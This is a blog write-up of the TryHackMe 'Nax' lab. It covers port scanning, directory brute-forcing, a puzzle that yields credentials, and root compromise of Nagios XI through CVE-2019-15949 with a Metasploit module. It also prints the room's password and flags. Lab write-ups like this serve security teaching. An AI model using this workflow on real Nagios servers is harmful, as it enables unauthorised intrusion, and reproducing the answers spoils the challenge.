---
title: "Nax - TryHackMe"
author: Ludovic COULON
date: 2020-05-13
hero: ./images/hero.png
excerpt: "Writeup for the Nax challenge on TryHackMe"
---

[TryHackMe | Nax](https://tryhackme.com/room/nax)

<div className="Image__Small">
  <img src="https://i.imgur.com/LNE0Fl9.png" alt="blog_image" />
</div>

Are you able to complete the challenge?

The machine may take up to 5 minutes to boot and configure

### Setup

```bash
➜  TryHackMe nmap -sV -sC -vv  10.10.167.60
```

```bash
Discovered open port 25/tcp on 10.10.167.60
Discovered open port 22/tcp on 10.10.167.60
Discovered open port 443/tcp on 10.10.167.60
Discovered open port 80/tcp on 10.10.167.60
Discovered open port 389/tcp on 10.10.167.60
```

```bash
22/tcp  open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCw9lXSbmWYgGcDpP5NiHE9MMRQktk72HpmKY50dVs/GbfJMNa29eJNKsZ2XfAVsGUuxRdX42/fvaAUOoSZlNlARJUOhS+3fRX14Qx9itHqEoYTXXnSZ+lYc4HGbMkbGlbW3CqQ6zxO9kEbe8DbFi9BPkGOvjMk5mrVYqOpROlZwJvwCtK4g+LNkZibj3VZvZ+Ex410r4Xqd4TeIe+NRVmCEG5I57w60wZTwS6WAhQ86Td8ZhDr0hlN82vKe8KK8Q6Qyt4NNa4GrwJAil0DMSSrSdgiFPWfSBN0RcaGq6xTyd3m4bUmKfqSJ+hhvpoQ5CJNQK5dtIfLulV5iEVWXKtV
|   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA6AY/MaydX6jLtiYXUhTaSQuNB4h08nsJd8MIxQ4b77d5qBK89b0rXrmxH8TavI5HpHOnAYeSMWcgrWcKAnBXk=
|   256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICcps6PPy9z/iS7bgKohT/GXERf6a6hWzhuWyeNMtzcw

25/tcp  open  smtp     syn-ack Postfix smtpd
|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-03-23T23:42:04
| Not valid after:  2030-03-21T23:42:04
| MD5:   9b85 15ad 46a7 016e 319a 033d 7d96 edbe
| SHA-1: c488 0c2d a210 38dd cfbb a299 4a2a b69c 63fd 2cdc
| -----BEGIN CERTIFICATE-----
| MIICsjCCAZqgAwIBAgIJAMztBzdUafrfMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMMBnVidW50dTAeFw0yMDAzMjMyMzQyMDRaFw0zMDAzMjEyMzQyMDRaMBExDzAN
| BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAM4f
| Mj+6LmA7krMf32EdXKtdfPVFVFf3367a+trh4/H6MHZJVOpZ+CrH1j4RTjr9SONC
| l5Fzrz1hR1o1oXIwsAXrtqcvYGeNT7gwH4D6m6zifSaOAWEy/IMsbe3+sPMIUPlS
| 4NdFl4J6PeyeAAnShUzAOAdUqsvSsAmmvN3ze+Y2OGGfOlO1s7n25FDs72zXo2nX
| i1EO+1mVdUWuM/Qr8Zctilwv9QNPWxcoTG/Zac/q8/pboWaUg3pf6mfFLbwo96ba
| 8p8QR8gfD1Vc1xQMN98/2lPxo8ISkW9ffcBzy0ILIhkSD/8EmynmC7FhgogCU+/l
| fYpeC3wLLigkDZnOgL0CAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
| AAOCAQEABDjkkOLVJfqNq1qSDGBgu7IJCG1CAByl82DGlam2nsVBhji54hviiyBi
| euCyeqJRPOX2qS7Kl0scMFw+DVxNW867HcrtTYEHuo1gOCGX3QFz+eUuKf+4X1Wr
| a7VgSeYVhboT4w4tKm8Rprh7QkHp9MNTB9TR/edG9RtFJZXtSlykeS5lLeC3DjRw
| 0NhWpgG2ZLa9URDrpzErvVwOBN46IS0PqwDCxJSvsH6sBQhgrm5so71jrPHwmh/o
| aaqO96Rw+1aRRLwz0O0TEO4aMw8/seeiRJ8w4kXMOy9UrCM5+yW6fbtMKYsmEPJO
| RxSanrURYb9UJxdRfeWPqWYU1AHVwg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time

80/tcp  open  http     syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesnt have a title (text/html).

389/tcp open  ldap     syn-ack OpenLDAP 2.2.X - 2.3.X

443/tcp open  ssl/http syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesnt have a title (text/html).
| ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/localityName=St. Paul/organizationalUnitName=Development
| Issuer: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/localityName=St. Paul/organizationalUnitName=Development
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-03-24T00:14:58
| Not valid after:  2030-03-22T00:14:58
| MD5:   636c ab0f 6399 34e3 b6de e6e2 b294 d4ef
| SHA-1: 80cd 2e1b 110f 1b5f 1943 1b3f c218 71e7 8b98 6801
| -----BEGIN CERTIFICATE-----
| MIIDzTCCArWgAwIBAgIBADANBgkqhkiG9w0BAQUFADCBgDELMAkGA1UEBhMCVVMx
| EjAQBgNVBAgMCU1pbm5lc290YTERMA8GA1UEBwwIU3QuIFBhdWwxGzAZBgNVBAoM
| Ek5hZ2lvcyBFbnRlcnByaXNlczEUMBIGA1UECwwLRGV2ZWxvcG1lbnQxFzAVBgNV
| BAMMDjE5Mi4xNjguODUuMTUzMB4XDTIwMDMyNDAwMTQ1OFoXDTMwMDMyMjAwMTQ1
| OFowgYAxCzAJBgNVBAYTAlVTMRIwEAYDVQQIDAlNaW5uZXNvdGExETAPBgNVBAcM
| CFN0LiBQYXVsMRswGQYDVQQKDBJOYWdpb3MgRW50ZXJwcmlzZXMxFDASBgNVBAsM
| C0RldmVsb3BtZW50MRcwFQYDVQQDDA4xOTIuMTY4Ljg1LjE1MzCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANdnw2CkJpNnnwjJ+PaxonTH/G5TSKLru67c
| aQyy4FhI/xa+0Dwn/HjWnWIOE3gOQB7QyOyG30guUpFohUEtC9agL7tpogpxrV8l
| ie0vhXsz0ETdzMhaou6QOrLS1OSspAh+t492t71BILl6ReHPLoFyEghyRctP/iK0
| PelUJKndJ2ElpLdbkMUuVzQ9mp8qIjoTF4CS1JwiUESCtikRmZWp398buklzNGgF
| VZIRJPu5VZMPGc7Ui3QUSaTF2aqi9FRXZRXN+0q2nWvdUFrUqnzrmaVynOupGXhS
| O17VZtC9F/GM+yWpg3Lck9wevt5o3nnYW4k8h5kDNHu4f0oDR88CAwEAAaNQME4w
| HQYDVR0OBBYEFFRhBQ3MZkrfjRqOlHjApJZAN+juMB8GA1UdIwQYMBaAFFRhBQ3M
| ZkrfjRqOlHjApJZAN+juMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEB
| ABeWyFzGfxf3vmGuLXdDXVj5e1LwBlvoNmHGf11Buy/yljpUI6jg1HxUTSABU/iS
| ZSsCnwOQ5dtqRAIcvFp07ZlUw9DpeSChj2jxXw+YxINOSqqNgE66zelXV9rJb7TX
| HWho2/g6OzKs5ii2h5lyjlValQAgfxBYJpRjvf4FfIJpzL+RnrsOqJBNUurbAn1L
| yNkqSDJhCPNN/g0V6eyOZRjTipV2FzcHYrbt84qFPN8gQ5Rpd6wNOWoUfuY1tL6H
| yepaZ/iLv+wY60Kxd8+GD4Oy7Tpz+Ilkr48EIUffejHzVrcn7JikS8+Uf8nvDi9Q
| LnC7LykFocxS13IXPcTfrnI=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### #1 What hidden file did you find?

```bash
➜  TryHackMe gobuster dir -u http://10.10.167.60/nagiosxi -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.167.60/nagiosxi
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/12 20:58:31 Starting gobuster
===============================================================
/images (Status: 301)
/about (Status: 301)
/help (Status: 301)
/tools (Status: 301)
/admin (Status: 301)
/reports (Status: 301)
/account (Status: 301)
/includes (Status: 301)
/backend (Status: 301)
/db (Status: 301)
/api (Status: 301)
/config (Status: 301)
/views (Status: 301)
Progress: 8866 / 220561 (4.02%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/05/12 20:59:44 Finished
===============================================================
```

```bash
Welcome to elements.
Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
```

[Find Your Name in the Periodic Table of the Elements](https://www.lmntology.com/)

```bash
Ag => 47
Hg => 80
Ta => 73
Sb => 51
Po => 84
Pd => 46
Hg => 80
Pt => 78
Lr => 103
```

Now we need to convert the ASCII to the plain text

[Convert Ascii Numbers to Text online](https://convert.town/ascii-to-text)

<div className="Image__Medium">
  <img src="https://imgur.com/5MSw49r.png" alt="blog_image" />
</div>

```bash
/PI3T.Png
```

### #2 Who is the creator of the file?

[http://10.10.167.60/PI3T.PNg](http://10.10.167.60/PI3T.PNg)

<div className="Image__Medium">
  <img src="https://imgur.com/zoIXy8Z.png" alt="blog_image" />
</div>

```bash
➜  TryHackMe exiftool PI3T.PNg
ExifTool Version Number         : 11.94
File Name                       : PI3T.PNg
Directory                       : .
File Size                       : 959 kB
File Modification Date/Time     : 2020:03:25 00:00:15-04:00
File Access Date/Time           : 2020:05:12 21:14:02-04:00
File Inode Change Date/Time     : 2020:05:12 21:13:29-04:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 990
Image Height                    : 990
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 768 bytes, use -b option to extract)
Transparency                    : (Binary data 256 bytes, use -b option to extract)
Artist                          : "Piet Mondrian"
Copyright                       : Piet Mondrian, tryhackme 2020
Image Size                      : 990x990
Megapixels                      : 0.980
```

### #3 What is the username you found?

The default user ID used to log in to the PurePower Integrated Manager Nagios Core web interface is nagiosadmin and the password is PASSW0RD (with a zero). More accounts can be created, or the password can be updated by using the command line. (IBM Website google search)

```bash
nagiosadmin
```

### #4 What is the password you found?

[BertNase's Own - npiet fun!](https://www.bertnase.de/npiet/npiet-execute.php)

<div className="Image__Medium">
  <img src="https://imgur.com/7h7Snvu.png" alt="blog_image" />
</div>

```bash
n3p3UQ&9BjLp4$7uhWdY
```

### #5 What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

[jakgibb/nagiosxi-root-rce-exploit](https://github.com/jakgibb/nagiosxi-root-rce-exploit)

```bash
CVE-2019-15949
```

### #6 Now that we've found our vulnerability, let's find our exploit. For this

section of the room, we'll use the Metasploit module associated with
this exploit. Let's go ahead and start Metasploit using the command
`msfconsole`.

```bash
No responses
```

### #7 After Metasploit has started, let's search for our target exploit using the command 'search applicationame'. What is the full path (starting withexploit) for the exploitation module?

<div className="Image__Medium">
  <img src="https://imgur.com/JzigN7U.png" alt="blog_image" />
</div>

```bash
linux/http/nagios_xi_authenticated_rce
```

### #8 Compromise the machine and locate user.txt

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
$ cd /home
$ ls
galand
$ cd galand
$ ls
nagiosxi  user.txt
$ cat user.txt
THM{84b17add1d72a9f2e99c33bc568ae0f1}

```

### #9 Locate root.txt

```bash
$ sudo -l
Matching Defaults entries for root on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on ubuntu:
    (ALL : ALL) ALL
$ sudo su
root@ubuntu:/home/galand$ cd /root/
cd /root/
root@ubuntu:~$ ls
root.txt  scripts
root@ubuntu:~$ cat root.txt
THM{c89b2e39c83067503a6508b21ed6e962}
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/8vldBpt.png" alt="TryhackMeProfile" />
  </a>
</center>
